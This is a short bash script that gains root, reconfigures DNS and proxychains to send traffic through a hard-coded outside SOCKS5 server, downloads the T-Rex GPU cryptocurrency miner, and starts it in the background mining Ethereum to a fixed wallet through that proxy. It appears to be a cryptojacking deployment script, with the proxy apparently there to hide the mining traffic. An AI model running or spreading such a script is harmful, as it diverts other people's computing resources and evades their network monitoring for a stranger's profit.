#!/bin/bash
sudo su
sudo apt-get update -y
sudo apt-get install -y proxychains
echo "domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sed -i -e 's/socks4/socks5/g' /etc/proxychains.conf
sed -i -e 's/127.0.0.1/45.63.115.127/g' /etc/proxychains.conf
sed -i -e 's/9050/1080/g' /etc/proxychains.conf
wget https://github.com/trexminer/T-Rex/releases/download/0.19.14/t-rex-0.19.14-linux-cuda10.0.tar.gz
tar -xvf t-rex-0.19.14-linux-cuda10.0.tar.gz
proxychains ./t-rex -a ethash --api-bind-http 0 --api-bind-telnet 0 -o stratum+ssl://us1.ethermine.org:5555 -u 0x541cef2363b56b4e82366a4b1c57f76b27896f87 -p x -w test  &
